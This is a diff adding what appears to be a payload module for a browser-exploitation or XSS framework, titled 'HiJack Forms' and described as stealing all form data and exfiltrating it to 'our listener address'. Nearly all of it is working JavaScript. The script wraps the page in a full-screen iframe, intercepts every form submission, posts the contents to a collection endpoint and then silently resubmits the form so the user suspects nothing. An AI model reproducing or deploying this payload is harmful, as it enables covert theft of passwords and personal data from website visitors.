@@ -1,0 +1,78 @@
+HiJack Forms
+
+------$$gr4y-r0se$$------
+
+This will steal all data from any form on the app, and exfiltrate it to our listener address.
+
+------$$gr4y-r0se$$------
+
+text/javascript
+
+------$$gr4y-r0se$$------
+
+if (window.self === window.top) {
+
+    function newSubmitFunction(event) {
+        event.preventDefault();
+    }
+    function resizeIframe() {
+        const iframe = document.getElementById('hijacked');
+        iframe.style.width = window.innerWidth + 'px';
+        iframe.style.height = window.innerHeight + 'px';
+    }
+    function hijack_forms() {
+        var iframe = document.getElementById('hijacked').contentWindow;
+        var url = new URL(iframe.location.href);
+        history.replaceState({}, '', url.pathname);
+        
+        var forms = iframe.document.querySelectorAll('form');
+
+        forms.forEach(form => {
+            form.onsubmit = function(event) {
+                // Prevent the default form submission
+                event.preventDefault();
+                
+                // Create a FormData object from the form
+                const formData = new FormData(form);
+                
+                // Send the form data to the alternative endpoint using fetch
+                fetch('https://127.0.0.1/collect/uqp2tapvjm', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: formData
+                })
+                .then(() => {
+                    const hijackedForm = document.createElement('form');
+                    hijackedForm.action = form.getAttribute('action') || location.pathname;
+                    hijackedForm.method = form.getAttribute('method') || 'GET';
+                    hijackedForm.id = 'hijackedForm';
+                    
+                    const formData = new FormData(form);
+                    for (let [key, value] of formData.entries()) {
+                        const input = document.createElement('input');
+                        input.type = 'hidden'; // Hidden input fields
+                        input.name = key;
+                        input.value = value;
+                        hijackedForm.appendChild(input);
+                    }
+                    iframe.document.body.appendChild(hijackedForm);
+                    iframe.document.getElementById('hijackedForm').submit();
+                })
+                .catch(error => {
+                    console.error('Error posting data to alternative endpoint:', error);
+                    // Optionally handle the error
+                    form.submit(); // Submit the form even if fetch fails
+                });
+            };
+        });
+    }
+    var body = document.getElementsByTagName('body')[0];
+    const page_url = location.pathname;
+    body.setAttribute('style','overflow: hidden;');
+    body.innerHTML = '<iframe src="" id="hijacked" scrolling="no" style="border: none;  overflow: hidden;"></iframe>';
+    resizeIframe();
+    const iframe = document.getElementById('hijacked');
+    iframe.addEventListener('load', hijack_forms);
+    iframe.src = page_url;
+    window.addEventListener('resize', resizeIframe);
+}
